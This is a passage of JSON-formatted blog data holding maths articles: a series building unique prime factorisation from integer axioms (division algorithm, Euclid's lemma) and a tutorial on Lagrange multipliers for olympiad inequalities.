\\\\neq 1$, we\\'ll show a contradiction. $x \\\\in \\\\mathbb{N} \\\\implies x \\\\gt 1$ (Lemma 17 and defn. of \"$\\\\geq$\") $\\\\implies 1 \\\\cdot n \\\\lt x \\\\cdot n$ (defn. of \"$\\\\lt$\" and Lemma 13) $\\\\implies n \\\\lt n$ So $n -n \\\\in \\\\mathbb{N}$, so $0 \\\\in \\\\mathbb{N}$, contradicting Trichotomy. Phew, that was a lot of lemmas! But I hope you agree they\\'re all very fundamental. In the next part, we\\'ll look at proving our first important theorem - the division algorithm. These six properties come from the fact that $\\\\mathbb{Z}$ is a ring (mathematical structure). \u21a9 I\\'m gonna skip over the whole \"is 0 a natural number\" thing. \u21a9 The well-ordering principle is actually equivalent to induction! \u21a9", "id": -3418355557506710901, "dir": ["maths", "proving-FTA"], "name": "1-integer-axioms"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1690300800.0, "mod_date_time": "25 Jul 2023", "cr_timestamp": 1690300800.0, "cr_date_time": "25 Jul 2023", "tags": [{"name": "number-theory", "colour": "pink"}, {"name": "pedantic", "colour": "yellow"}], "title": "Discovering Division", "content": "tl;dr: A journey from the ground up in which we use axioms to build a proof that every positive integer can be uniquely prime factored. This is part 2, where we use the rigorous foundation we developed in part 1 to establish the division algorithm. In general, the level of rigor will decrease as the parts go on, so that the reader doesn\\'t get bored to death. But it should be obvious how to fill out everything with complete rigor. Here is a glossary of math symbols. Back to School Children tend to get taught division as repeated subtraction - for example, 14 divided by 3 is 4 remainder 2, because: $14 - 3 = 11$ $11 - 3 = 8$ $8 - 3 = 5$ $5 - 3 = 2$ And we stop because if we subtract again, the remainder becomes negative. In particular, 2<3, and in general the remainder is always less than the divisor, because if it was at least as big then we could always subtract off another copy. That would definitely be enough justification to any high schooler as to why the division algorithm works. But, how do we prove it from our axioms and lemmas that we\\'ve developed so far? How do we make infinite descent rigorous? Let\\'s first formalize the statement we want to prove: For any $a \\\\in \\\\mathbb{Z}, b \\\\in \\\\mathbb{N}$, there exist integers $q,r$ such that $a = bq + r$, and $0 \\\\leq r \\\\lt b$. Now... how do we attempt a proof? The key is the well-ordering principle that we introduced, stating that every non-empty subset of the naturals has a least element. To use this, we can consider the set of all possible remainders, i.e. all the possible numbers we can obtain by starting with $a$ and adding or subtracting $b$. Then we can consider those remainders that are natural, and take the smallest element. If it\\'s at least $b$, then we can subtract $b$ again to get a smaller element of the set, contradiction. In other words, \"choose the smallest possible remainder, if it\\'s at least $b$ then subtract $b$\". Do you see how this is equivalent to the infinite descent argument? Let $a$ be a fixed integer and $b$ be a fixed natural. Consider the set: $$S = \\\\{n \\\\in \\\\mathbb{N} \\\\mid n = a - bq + 1, q \\\\in \\\\mathbb{Z}\\\\}$$ Then S is a subset of the naturals. Furthermore, it is nonempty, because: if $a \\\\in \\\\mathbb{N}$ or $a=0$, then when $q=0$, $n = a - b \\\\cdot 0 + 1 = a+1$ which is natural and so it is an element of S. if $-a \\\\in \\\\mathbb{N}$, then when $q = -a$, $n = a-b(-a) + 1$ $ = (-a)(b-1) + 1$ which is natural since $(-a), (b-1)$ are nonnegative, and so it is an element of S. By Trichotomy, we considered all cases, thus S is always non-empty. Hence by the well-ordering principle, S has a least element (say $e$), occuring when $q = q_0$, so that $e = a - bq_0+1$. $e \\\\leq b$ Suppose not, we will show a contradiction. Then $e\\\\gt b$, so $e-b \\\\in \\\\mathbb{N}$ (defn. \"$\\\\gt$\"). But $e-b = (a-bq_0+1)-b$ $ = a-b(q_0+1)+1$, and so $e-b \\\\in S$. But $e-b \\\\lt e$, contradicting the minimality of $e$. Now at last, letting $r = e-1$, we have $a = bq_0 + r$ (since $e = a-bq_0+1$). Since $0 \\\\lt e \\\\leq b$, we have $0 \\\\leq r \\\\lt b$, which is what we wanted, and we are done. Note that I stopped writing the multiply symbol in between two letters, as per normal convention. Also, I stopped being as rigorous as in part 1 (for example writing \"$a-bq+1$\" instead of \"$(a-bq)+1$\" due to associativity), because I don\\'t think anyone would want to read such a long tedious proof. BUT, it should be clear (if not monotonous) how to fill out this proof into one as rigorous as in part 1. And that\\'s it! We\\'ve now proved the division algorithm. High schoolers would be very impressed (not). Can you come up with an analogous division algorithm for the complex numbers? Can you prove that it works? \u21a9", "id": 379598415800106056, "dir": ["maths", "proving-FTA"], "name": "2-division-algo"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1690452000.0, "mod_date_time": "27 Jul 2023", "cr_timestamp": 1690452000.0, "cr_date_time": "27 Jul 2023", "tags": [{"name": "number-theory", "colour": "pink"}], "title": "Proving Euclid's Lemma", "content": "tl;dr: A journey from the ground up in which we use axioms to build a proof that every positive integer can be uniquely prime factored. This is part 4, where we use what we have so far to finally prove Euclid\\'s Lemma (technically, the generalized version). In general, the level of rigor will decrease as the parts go on, so that the reader doesn\\'t get bored to death. But it should be obvious how to fill out everything with complete rigor. Here is a glossary of math symbols. What? It\\'s... argh! Ask anyone to prove this: If $2x$ is divisible by $3$, then so is $x$. I bet that almost everyone would attempt to use prime factorization: \"in the prime factorization of $2x$, there must be a 3. But 2 is a prime, thus the 3 must occur in the prime factorization of $x$.\" Ok... but we\\'re trying to prove prime factorization, so we can\\'t use it! Actually, we can do something smart in this case: if $3 \\\\mid 2x$, then $3 \\\\mid (3x - x)$. But $3 \\\\mid 3x$, therefore $3 \\\\mid x$, by Lemma 4 in part 1 (i.e. that if $a \\\\mid b, a \\\\mid c$ then $a$ divides any linear combination of $b$ and $c$). In other words, if $2x$ is divisible by 3 then so is $-2x$, therefore so is $-2x + 3x$. Now ask them to prove the generalized version: If $a \\\\mid bc$ and $gcd(a,b) = 1$, then $a \\\\mid c$. Here\\'s where most people would really like to appeal to prime factorization: \"the set of prime factors of b must be completely different to the set of prime factors of a, else they would share a common factor. So in the prime factorization of bc, removing the factorization of b will not affect any primes that divide a. So a divides c.\" So, how do we prove this using only the things we\\'ve built out of axioms? We can actually generalize the trick from before! In the \"if $3 \\\\mid 2x$ then $3 \\\\mid x$\" case, the trick was to write 1 (the desired coefficient of $x$) as a linear combination of 2 and 3: $$x = (3-2)x = 3x-2x$$ And this let us deduce that if $3 \\\\mid 2x$, then $3 \\\\mid 3x - 2x$ because both $3x$ and $2x$ are divisible by 3. Let\\'s try with a different pair of numbers. If $51 \\\\mid 28x$, does $51 \\\\mid x$ ? TRICK: Try to write 1 as a linear combination of 51 and 28. But we know we can do this, by Bezout\\'s Lemma, which we proved in the last part! To find a concrete solution, use the magic box (see the last part if you are unfamiliar): 1 1 4 1 1 2 0 1 1 2 9 11 20 51 1 0 1 1 5 6 11 28 So, $11 \\\\cdot 51 - 20 \\\\cdot 28 = 1$. Now to use the trick: $$x = (11 \\\\cdot 51 - 20 \\\\cdot 28)x$$ $$ = 51 \\\\cdot (11x) + 28x \\\\cdot (-20)$$ Hence, if $51 \\\\mid 28x$, then $51 \\\\mid x$, because we wrote $x$ as a linear combination of things that were divisible by 51. I think we\\'re ready to generalize now. If $a \\\\mid bc$ and $gcd(a,b)=1$, then $a \\\\mid c$. True in $\\\\mathbb{Z}$. Suppose $a \\\\mid bc$ and $gcd(a,b) = 1$. Then by Bezout\\'s Lemma, there exist integers $x,y$ such that $ax + by = 1$. Hence, $c = (ax+by)c = a(cx) + y(bc)$. Since $a \\\\mid bc$ and $a \\\\mid a(cx)$, we have that $a \\\\mid a(cx) + y(bc)$, so $a \\\\mid c$, as required. Nice - surprisingly simple proof, right? The actual Euclid\\'s Lemma Actually, Euclid\\'s Lemma states that if $p$ is a prime and $p \\\\mid ab$ (where $a,b$ are two integers), then $p \\\\mid a$ or $p \\\\mid b$. But what we\\'ve already proved is pretty much a generalized version of this: the only extra thing we need to prove is that if $p$ doesn\\'t divide $a$, then $gcd(p, a) = 1$. But this is true by definition of prime - if $gcd(p,a) > 1$ then $p$ has a factor that isn\\'t $1$ or $p$ (namely, this factor is $gcd(p,a)$); contradiction.", "id": 7443006454541466730, "dir": ["maths", "proving-FTA"], "name": "4-euclid"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1734737400.0, "mod_date_time": "20 Dec 2024", "cr_timestamp": 1689350400.0, "cr_date_time": "14 Jul 2023", "tags": [{"name": "olympiad", "colour": "purple"}, {"name": "analysis-intro", "colour": "indigo"}], "title": "Revenge of Analysis: Using Lagrange Multipliers to Destroy Olympiad Inequalities", "content": "Goal: learn how to use Lagrange multipliers in olympiads. Lagrange multipliers are a nice tool to solve inequalities, but they are rarely seen in olympiad solutions. Once you are comfortable with it, it can be an overpowered way smash open inequalities without much insight. (So economists love them!) For this reason, we need to approach it rigorously, to ensure we can justify earning marks. I really recommend watching this video to get some intuition first. Background Theory All of this is covered in my course notes for IB Analysis and Topology, in the relevant sections. The results and definitions in this article are correct only for $\\\\mathbb{R}^n$ (e.g. compactness is something different, but the Heine-Borel theorem says that in $\\\\mathbb{R}^n$ it\\'s equivalent to being closed and bounded). For the more general definitions and a deeper understanding, check out the course notes. Consider a set $M$ together with a function $d : M \\\\times M \\\\to \\\\mathbb{R}$. $(M, d)$ is a metric space if: $d(x,y) \\\\geq 0$, equality if and only if (\"iff\") $x=y$ (\"positive semi-definite\") $d(x,y) = d(y,x)$ (\"symmetric\") $d(x,y) + d(y,z) \\\\geq d(x,z)$ (\"triangle inequality\") $(\\\\mathbb{R}^n, d)$ is a metric space, where: $$\\\\mathbb{R}^n = \\\\{(x_1, \\\\cdots, x_n) \\\\mid x_i \\\\in \\\\mathbb{R}\\\\}$$ $$d(x,y) = \\\\sqrt{\\\\sum_{i=1}^n (x_i-y_i)^2}$$ The open ball in $\\\\mathbb{R}^n$ with centre $p \\\\in \\\\mathbb{R^n}$ and radius $r$ is $$B(p,r) := \\\\{x \\\\in \\\\mathbb{\\\\mathbb{R}^n} \\\\mid d(p,x) \\\\lt r \\\\}$$ Similarly, the closed ball $B[p,r]$ is the set: $$\\\\{x \\\\in \\\\mathbb{R}^n \\\\mid d(p,x) \\\\leq r\\\\}$$ Any finite open interval in $\\\\mathbb{R}$ is an open ball ($n=1$), because for any open interval $(a,b) \\\\subset \\\\mathbb{R}$, it is equal to $B(\\\\frac{a+b}{2}, \\\\frac{b-a}{2})$. $B[0,1]$ in $\\\\mathbb{R}^2$ is $U \\\\subseteq \\\\mathbb{R}^n$ is open if for every $p \\\\in U$, $\\\\exists r\\\\gt 0$ s.t. $B(p,r) \\\\subset U$. Informally: an \\'open set\\' is a set such that for any point $x$ in the set, we can fit a ball ball around $x$, while staying inside the set. Let $(x_k)_{k=1}^\\\\infty$ be a sequence in $\\\\mathbb{R}^n$. The sequence converges to the point $x_\\\\infty$ if $\\\\forall \\\\epsilon \\\\gt 0, \\\\exists n_0 \\\\in \\\\mathbb{N}$ such that: $$n \\\\geq n_0 \\\\implies d(x_n, x_\\\\infty) \\\\lt \\\\epsilon$$ Then $x_\\\\infty$ is denoted $\\\\lim_{n \\\\to \\\\infty}(x_n)$. Let $x_n = \\\\left(\\\\frac{1}{n}, \\\\frac{1}{n}\\\\right)$, then $\\\\lim_{n \\\\to \\\\infty} x_n = (0,0)$. $\\\\lim_{n \\\\to \\\\infty} \\\\left(1-\\\\frac{1}{n}\\\\;,\\\\; \\\\frac{1}{n^2}\\\\right) = (1,0)$ Let $S \\\\subseteq \\\\mathbb{R}^n$. $S$ is closed if for every sequence of points $(x_k)_{k=1}^\\\\infty$ that satisfies $x_k \\\\in S \\\\;\\\\forall\\\\; k$, we have $\\\\left( \\\\lim_{k \\\\to \\\\infty} x_k \\\\right) \\\\in S$. $B(0,1)$ is not closed because we can take $x_k = (1 - \\\\frac{1}{k}, 0, \\\\cdots, 0).$ Any open ball together with one point on the boundary, is neither closed nor open. Let $A \\\\in \\\\mathbb{R}^n$. The closure of $A$, denoted $\\\\bar A$, is the smallest closed set containing $A$. $A \\\\subseteq \\\\mathbb{R}^n$ is closed if and only if $\\\\mathbb{R}^n \\\\setminus A$ is open. Let $U,V$ be open sets. Then $U \\\\cap V$ and $U \\\\cup V$ are also open sets. This extends to finite intersections and infinite unions. Let $S,T$ be closed sets. Then $S \\\\cap T$ and $S \\\\cup T$ are also closed sets. This extends to infinite intersections and finite unions. $A \\\\subseteq \\\\mathbb{R}^n$ is bounded if $\\\\exists\\\\, R \\\\in \\\\mathbb{R}, R\\\\gt 0$ such that $A \\\\subseteq B(0, R)$. A subset $K \\\\subseteq \\\\mathbb{R}^n$ is compact if it is closed and bounded. Let $D \\\\subseteq \\\\mathbb{R}^n$ and let $f : D \\\\to \\\\mathbb{R}$. $f$ is continuous at the point $p \\\\in D$ if $\\\\forall \\\\epsilon \\\\gt 0$, $\\\\exists \\\\delta \\\\gt 0$ such that $\\\\forall x \\\\in D$ we have: $$d(p,x) \\\\lt \\\\delta \\\\implies \\\\lvert f(x) - f(p) \\\\rvert \\\\lt \\\\epsilon$$ $f$ is continuous if it is continuous at every point. Informally, no matter how small $\\\\epsilon$ you pick, I can always find a region around $p$ where the change in $f$ is smaller than $\\\\epsilon$. So, a small change in input causes a small change in ouput. $f : \\\\mathbb{R}^n \\\\to \\\\mathbb{R}$, $f(x_1, \\\\cdots, x_n) = x_1 + \\\\cdots + x_n$ Let $f : K \\\\to \\\\mathbb{R}$ be a continuous function, where $K \\\\subseteq \\\\mathbb{R}^n$ is a nonempty compact set. Then $f$ has both a global maximum value and a global minimum value: $$\\\\exists\\\\, x \\\\in K \\\\text{ s.t. } f(x) \\\\geq f(y) \\\\;\\\\forall\\\\, y \\\\in K$$ $$\\\\exists\\\\, x\\' \\\\in K \\\\text{ s.t. } f(x\\') \\\\leq f(y) \\\\;\\\\forall\\\\, y \\\\in K$$ Let $K$ be a closed ball in $\\\\mathbb{R}^2$, then $K$ is compact. Let $f : K \\\\to \\\\mathbb{R}, f(x) = d(x,(0,0))$ which is continuous. Then the theorem says that there is a point(s) on $K$ which is closest to $(0,0)$, and a point(s) which is furthest. <AUTOSVG src=\\'lagrange-mult/11-closedBall.svg\\' width=\\'200\\' height=\\'200\\'/> Note: We need to assume $K$ is closed for this theorem, else we can construct a counterexample where $f$ increases to infinity the closer you get to the edge. Let $g : \\\\mathbb{R}^n \\\\to \\\\mathbb{R}$ be continuous. Then for a fixed $c \\\\in \\\\mathbb{R}$, the set $$\\\\{ x \\\\in \\\\mathbb{R}^n \\\\mid g(x) = c \\\\}$$ is closed in $\\\\mathbb{R}^n$. Partial Derivatives I\\'m assuming you\\'ve already met these, so I\\'ll recap. $f : \\\\mathbb{R}^3 \\\\to \\\\mathbb{R}, f(x,y,z) = x^2 + y^2 + z^2$ $$\\\\frac{\\\\delta f}{\\\\delta x} = 2x, \\\\frac{\\\\delta f}{\\\\delta y} = 2y, \\\\frac{\\\\delta f}{\\\\delta z} = 2z, \\\\nabla f = (2x,2y,2z)$$ $f : (0, +\\\\infty) \\\\times (0, +\\\\infty) \\\\to \\\\mathbb{R}, f(x,y) = \\\\sqrt{xy}$. $$\\\\nabla f = (\\\\frac{\\\\sqrt y}{2 \\\\sqrt x}, \\\\frac{\\\\sqrt x}{2 \\\\sqrt y})$$ The Big Theorem Finally! Let $U \\\\subset \\\\mathbb{R}^n$ be an open set[^4] and let $f,g : U \\\\to \\\\mathbb{R}$ be continuous functions with continuous partial derivatives of the first order. Let $c \\\\in \\\\mathbb{R}$ and $S = \\\\{x \\\\in U \\\\mid g(x) = c\\\\}$. (Note: $S$ doesn\\'t have to be open or closed, that\\'s $U$!) Then, if $x_0 \\\\in S$ is a local max or min, then either: $$\\\\left( \\\\frac{\\\\delta g}{\\\\delta x}, \\\\frac{\\\\delta g}{\\\\delta y}, \\\\frac{\\\\delta g}{\\\\delta z},\\\\cdots\\\\right) = (0,0,0,\\\\cdots)$$ Or $\\\\exists \\\\lambda \\\\in \\\\mathbb{R}$ such that: $$\\\\frac{\\\\delta f}{\\\\delta x}(x_0) = \\\\lambda \\\\frac{\\\\delta g}{\\\\delta x}(x_0),$$ $$\\\\frac{\\\\delta f}{\\\\delta y}(x_0) = \\\\lambda \\\\frac{\\\\delta g}{\\\\delta y}(x_0),$$ $$\\\\frac{\\\\delta f}{\\\\delta z}(x_0) = \\\\lambda \\\\frac{\\\\delta g}{\\\\delta y}(x_0),$$ $$\\\\text{etc.}$$ Example Problem 1 Let $x,y,z \\\\geq 0$ such that $x+y+z = 1$. Find the min and max of $xyz$. Let $f(x,y,z) = xyz$ and $g(x,y,z)=x+y+z$; these are polynomial functions and so are continuous. We are maximizing and minimizing $f$, subject to a condition on $g$. $0 \\\\leq x,y,z \\\\leq 1$ so we\\'re only interested in the cube $[0,1] \\\\times [0,1] \\\\times [0,1]$. $x+y+z=1$ is a plane Let $U = (0,1)^3$, then $\\\\bar U = [0,1]^3$. Let $S = \\\\{x \\\\in U \\\\mid g(x)=1\\\\}$, then $\\\\bar S$ is bounded hence compact. Hence $f$ has a global max and min in $\\\\bar S$. The global extrema might be on the boundary of $\\\\bar S$. If so then we cannot apply LM, because the extrema will not be in $S$. If we are on the boundary, then one of $x,y,z$ is $0$, so $f(x,y,z) = xyz = 0$. Thus $f$ is zero everywhere on the boundary, so $0$ would be an extremum. If we are not on the boundary, then we are in $S$, so we can apply LM. $$\\\\frac{\\\\delta g}{\\\\delta x} = 1, \\\\frac{\\\\delta g}{\\\\delta y} = 1, \\\\frac{\\\\delta g}{\\\\delta z} = 1$$ So we are in the second case of the theorem, because $(1,1,1) \\\\neq (0,0,0)$. $$\\\\frac{\\\\delta f}{\\\\delta x} = yz, \\\\frac{\\\\delta f}{\\\\delta y} = xz, \\\\frac{\\\\delta f}{\\\\delta z} = xy$$ So $yz = \\\\lambda \\\\cdot 1$, $xz = \\\\lambda \\\\cdot 1$, $xy = \\\\lambda \\\\cdot 1$. This implies $xy = yz = zx$ so $x=y=z$, and finally $x+y+z = 1$ $\\\\implies$ $x=y=z=\\\\frac{1}{3}$, so an extremal value of $f$ is $\\\\frac{1}{27}$. Overall, all extreme values of $f$ on $\\\\bar S$ are $0$ or $\\\\frac{1}{27}$. $$\\\\therefore 0 \\\\leq xyz \\\\leq \\\\frac{1}{27}$$ Example Problem 2 Let $x,y,z \\\\geq 0$ such that $x+y+z = 1$. Show that $$0 \\\\leq yz+zx+xy-2xyz \\\\leq \\\\frac{7}{27}$$ Note $0 \\\\leq x,y,z \\\\leq 1$. Let $U = (0,1)^3$ and $S = \\\\{ x \\\\in U \\\\mid g(x) = 1\\\\}$. Let $f(x,y,z) = yz+zx+xy-2xyz$ and $g(x,y,z) = x+y+z$, where $f,g : U \\\\to \\\\mathbb{R}$. Then $f,g$ are continuous and have continous partial derivatives (because polynomial on open set). Now, $\\\\bar U = [0,1]^3$ and $\\\\bar S = \\\\bar U \\\\cap \\\\{x \\\\in \\\\mathbb{R}^3 \\\\mid g(x)=1\\\\}$ which is closed and bounded hence compact. Hence $f$ has a global max and min on $\\\\bar S$. Let $x_0 = (x,y,z)$ be a global extremum. If $x_0$ is on the boundary: Then one of $x,y,z$ is $0$, WLOG $z=0$. Then $x+y=1$ and we wish to show that $0 \\\\leq xy \\\\leq \\\\frac{7}{27}$. $$x \\\\geq 0, y \\\\geq 0 \\\\implies xy \\\\geq 0$$ $$xy \\\\leq \\\\left(\\\\frac{x+y}{2}\\\\right)^2 = \\\\frac{1}{4} \\\\lt \\\\frac{7}{27} \\\\;\\\\;\\\\checkmark$$ Else, $x_0$ is not on the boundary. Then $S$ has a global extremum in $f$, namely $x_0$. So I can apply LM. $$g(x,y,z)=x+y+z$$ $$\\\\nabla g = \\\\left(\\\\frac{\\\\delta g}{\\\\delta x}, \\\\frac{\\\\delta g}{\\\\delta y}, \\\\frac{\\\\delta g}{\\\\delta z}\\\\right)=(1,1,1)$$ Since $\\\\nabla g \\\\neq (0,0,0)$, the only possibility is $\\\\nabla f = \\\\lambda \\\\cdot \\\\nabla g$. $$f(x,y,z) = yz + zx + xy - 2xyz$$ $$\\\\frac{\\\\delta f}{\\\\delta x} = z+y-2yz$$ $$\\\\frac{\\\\delta f}{\\\\delta y} = x+z-2xz$$ $$\\\\frac{\\\\delta f}{\\\\delta z} = y+x-2yx$$ So, $z+y-2yz = \\\\lambda \\\\cdot 1$, $x+z-2xz = \\\\lambda \\\\cdot 1$, $y+x-2yx = \\\\lambda \\\\cdot 1$ Solving for $x,y,z$: First case : $x,y,z \\\\neq \\\\frac{1}{2}$ $z+y-2yz=\\\\lambda$ $\\\\implies y(1-2z) = \\\\lambda - z$ $\\\\implies y = \\\\frac{\\\\lambda - z}{1-2z}$ Similarly, $x = \\\\frac{\\\\lambda - z}{1-2z}$ So $x=y$, and similarly $x=y=z$. $x+y+z = 1$ $\\\\implies x=y=z=\\\\frac{1}{3}$ Second case : one of $x,y,z$ is $\\\\frac{1}{2}$ WLOG $z = \\\\frac{1}{2}$, then $\\\\frac{1}{2} + y - 2y\\\\cdot \\\\frac{1}{2} = \\\\lambda$ $\\\\implies \\\\lambda = \\\\frac{1}{2}$ $x+y = 1-z$ $\\\\implies x+y=\\\\frac{1}{2}$ $x+y-2xy = \\\\lambda$ $\\\\implies \\\\frac{1}{2} - 2xy = \\\\frac{1}{2}$ $\\\\implies xy = 0$, but this cannot happen in the interior. Thus overall, The extremum $x_0$ must equal $(\\\\frac{1}{3}, \\\\frac{1}{3}, \\\\frac{1}{3})$. $$f\\\\left(\\\\frac{1}{3}, \\\\frac{1}{3}, \\\\frac{1}{3}\\\\right) = \\\\frac{1}{9} + \\\\frac{1}{9} + \\\\frac{1}{9} - \\\\frac{2}{27} = \\\\frac{7}{27} \\\\;\\\\; \\\\checkmark$$ Example problem 3 Given that $x,y \\\\in \\\\mathbb{R}$ with $x^2 + y^2 = 1$, Find the max and min values of $8x^2 - 2y$. Note: the \"normal\" way to do this would be to write it as $8(1-y^2)-2y$ and bound this quadratic. But we can do it with LM too. I\\'ll let you decide which way is easier. Let $f,g : \\\\mathbb{R}^2 \\\\to \\\\mathbb{R}$ with: $$f(x,y) = 8x^2-2y$$ $$g(x,y) = x^2 + y^2$$ Then $f,g$ are continuous and have continuous partial derivatives. $$U := \\\\mathbb{R}^2$$ $$S := \\\\{x \\\\in U \\\\mid g(x) = 1\\\\}$$ $S$ is closed and bounded, hence $S$ is compact. Hence $f$ attains a global max and min on $S$. We can apply LM, because there is no boundary case to check. $$\\\\nabla g = (2x,2y)$$ So $\\\\nabla g \\\\neq (0,0)$ since $x^2 + y^2 = 1$. Hence we are in the second case: $$\\\\nabla f = \\\\lambda \\\\nabla g$$ $$\\\\implies \\\\begin{bmatrix} 16x \\\\\\\\ -2 \\\\end{bmatrix} = \\\\lambda \\\\begin{bmatrix} 2x \\\\\\\\ 2y \\\\end{bmatrix}$$ Thus we need to solve the following 3 simultaneous equations: $$16x = 2x\\\\lambda$$ $$-2 = 2y\\\\lambda$$ $$x^2 + y^2 = 1$$ If $x=0$, then $y^2 = 1$, so $(x,y) = (0,1)$ or $(0,-1)$. If $x\\\\neq 0$, then $\\\\lambda = 8$, so $-2 = 16y$. Hence $y=-\\\\frac{1}{8}$ and so $x^2 = 1 - \\\\frac{1}{64}$, so $x = \\\\pm \\\\frac{\\\\sqrt{63}}{8}$. Hence we need to check $(0,1)$,$(0,-1)$, $(\\\\frac{\\\\sqrt{63}}{8}, -\\\\frac{1}{8})$, $(-\\\\frac{\\\\sqrt{63}}{8}, -\\\\frac{1}{8})$. $$f(0, \\\\pm 1) = \\\\mp 2$$ $$f(\\\\pm \\\\frac{\\\\sqrt{63}}{8}, -\\\\frac{1}{8}) = \\\\frac{65}{8}$$ $$\\\\therefore -2 \\\\leq 8x^2 - 2y \\\\leq \\\\frac{65}{8}$$ Homogenous Trick Suppose we want to prove some inequality, but there are no constraints. If the inequality is homogenous, then we can impose a condition e.g. $a+b+c=1$ or $abc = 1$ or $a^2+b^2+c^2=1$, because we can scale each variable to make the condition true. Prove that $\\\\forall a,b,c \\\\in \\\\mathbb{R}$, $$a^2 + b^2 + c^2 \\\\geq ab + bc + ca$$ If $a=b=c=0$, the result is obvious. Otherwise, let $k = \\\\sqrt{a^2 + b^2 + c^2} \\\\gt 0$. The inequality is equivalent to: $$\\\\left(\\\\frac{a}{k}\\\\right)^2 + \\\\left(\\\\frac{b}{k}\\\\right)^2 + \\\\left(\\\\frac{c}{k}\\\\right)^2 \\\\geq \\\\frac{a}{k} \\\\cdot \\\\frac{b}{k} + \\\\frac{b}{k}\\\\cdot \\\\frac{c}{k} + \\\\frac{c}{k} \\\\cdot \\\\frac{a}{k}$$ And so, letting $x=\\\\frac{a}{k}$, $y = \\\\frac{b}{k}$, $z = \\\\frac{c}{k}$, we have that $x^2 + y^2 + z^2 = 1$. So it is enough to prove that $xy + yz + zx \\\\leq 1$ when $x^2 + y^2 + z^2 = 1$ (we chose this condition because of compactness). We can now solve this as in the examples above, using Lagrange multipliers. Practice problem (JBMO) For $x,y \\\\in \\\\mathbb{R}, (x,y) \\\\neq (0,0)$, prove that: $$\\\\frac{x+y}{x^2-xy+y^2} \\\\leq \\\\frac{2\\\\sqrt 2}{\\\\sqrt {x^2 + y^2}}$$ (Note: much easier to fix $y$ and use normal derivatives, but we want to solve with LM) The inequality is homogenous, so we can impose the condition $x^2 + y^2 = 1$ by scaling the variables. Thus it is sufficient to show that $\\\\frac{x+y}{x^2-xy+y^2} \\\\leq 2\\\\sqrt 2$ when $x^2 + y^2 = 1$. $$\\\\text{Goal: } \\\\frac{x+y}{x^2-xy+y^2} \\\\leq 2\\\\sqrt 2$$ $$\\\\iff 0 \\\\leq 2\\\\sqrt2(x^2-xy+y^2) -x - y$$ $$\\\\iff 0 \\\\leq 2\\\\sqrt2(1-xy) -x - y$$ Note that we didn\\'t have to clear the $x^2 + y^2$ term, but it makes the computation easier - always look for tricks! Now as usual, define: $$f,g: \\\\mathbb{R}^2 \\\\to \\\\mathbb{R}$$ $$f(x,y) = 2\\\\sqrt2(1-xy)-x-y$$ $$g(x,y) = x^2 + y^2$$ $$S = \\\\{x \\\\in \\\\mathbb{R}^2 \\\\mid g(x,y) = 1\\\\}$$ Then $S$ is closed. Since $S$ is also bounded, we have that $S$ is compact. Also $f,g$ are continuous with continuous partial derivatives, since they are polynomials. Hence $f$ has a global max and min on $S$. $\\\\nabla g = (2x,2y) \\\\neq (0,0)$ since $a^2 + b^2 = 1$. $$\\\\therefore \\\\nabla f = \\\\lambda \\\\nabla g$$ $$\\\\implies \\\\begin{bmatrix} -2\\\\sqrt2 y - 1 \\\\\\\\ -2\\\\sqrt2 x - 1\\\\end{bmatrix} = \\\\lambda \\\\begin{bmatrix} 2x \\\\\\\\ 2y\\\\end{bmatrix}$$ Hence, $$-2y\\\\sqrt2 - 1 = 2x\\\\lambda$$ $$-2x\\\\sqrt2 - 1 = 2y\\\\lambda$$ $$x^2 + y^2 = 1$$ Solving these to find $f(x,y)$: $$y(-2y\\\\sqrt2 - 1) = 2xy\\\\lambda$$ $$x(-2x\\\\sqrt2 - 1) = 2yx\\\\lambda$$ $$\\\\therefore -2y^2\\\\sqrt2 - y = -2x^2\\\\sqrt2 - x$$ $$\\\\implies 2\\\\sqrt2(x^2 - y^2) + (x-y) = 0$$ Thus either $x=y$ or $2\\\\sqrt2(x+y) + 1 = 0$. If $x = y$: Then, since $x^2 + y^2 = 1$, we have that $x = y = \\\\pm \\\\frac{1}{\\\\sqrt2}$. In this case: $$f(x,y) = f\\\\left(\\\\pm \\\\frac{1}{\\\\sqrt2}, \\\\pm \\\\frac{1}{\\\\sqrt2}\\\\right)$$ $$= 2\\\\sqrt2(1 - \\\\frac{1}{2}) - (\\\\pm \\\\sqrt 2)$$ $$= \\\\sqrt2 \\\\mp \\\\sqrt2$$ $$= 0, 2\\\\sqrt2$$ If $2\\\\sqrt2(x+y) + 1 = 0$: Then $x + y = -\\\\frac{1}{2\\\\sqrt2}$. $$\\\\implies (x+y)^2 = \\\\frac{1}{8}$$ $$\\\\implies 2xy = \\\\frac{1}{8} - (x^2+y^2) = \\\\frac{1}{8} - 1$$ $$\\\\implies xy = -\\\\frac{7}{16}$$ So in this case: $$f(x,y) = 2\\\\sqrt2(1-xy)-(x+y)$$ $$= 2\\\\sqrt2\\\\left(1+ \\\\frac{7}{16}\\\\right) + \\\\frac{1}{2\\\\sqrt2}$$ $$= \\\\frac{25\\\\sqrt2}{8}$$ Overall, the possible extremal values of $f$ are $0, 2\\\\sqrt2, \\\\frac{25\\\\sqrt2}{8}$. $$\\\\therefore 0 \\\\leq f(x,y) \\\\leq \\\\frac{25\\\\sqrt2}{8}$$ In particular, $f(x,y) \\\\geq 0$ as required. When It Fails Let $a,b,c \\\\gt 0$ such that $a+b+c=3$. Find the minimum value of: $$f(a,b,c) = \\\\frac{2-a^3}{a} + \\\\frac{2-b^3}{b} + \\\\frac{2-c^3}{c}$$ If we attempt to use LM: The problem is that $f$ is not defined on the boundary, so we cannot say $f$ has a global max and min in the area we\\'re looking at (indeed $f$ can be arbitrarily large if we let $a$ approach zero for example). Boo, we can\\'t use LM. Actually, in this specific case we can fix it with the following approach: Make the triangle a bit smaller on all sides, then it is compact and we can use LM. For the region of that we didn\\'t consider, we can assume that \"one of the variables is at least this small\", so \"$f$ is at least this large\", and get it to be larger than a value we already know. Conclusion As you\\'ve seen, it takes careful consideration and background knowledge to use Lagrange multipliers in olympiads correctly. Best of luck! $B[p,r]$ is a closed set. \u21a9 If $U_n = \\\\left(-\\\\frac{1}{n}, \\\\frac{1}{n}\\\\right)$, then $\\\\bigcup_{n=1}^\\\\infty U_n = \\\\{0\\\\}$ which is not open. \u21a9 This is not true in the reverse direction, for example consider $B(0,1)$ and $f(x) = d(x,0)$, then there is a global min at 0. \u21a9 Note that we could have also let $U$ be something like $\\\\{(x,y) \\\\in \\\\mathbb{R}^2 \\\\mid x^2+y^2 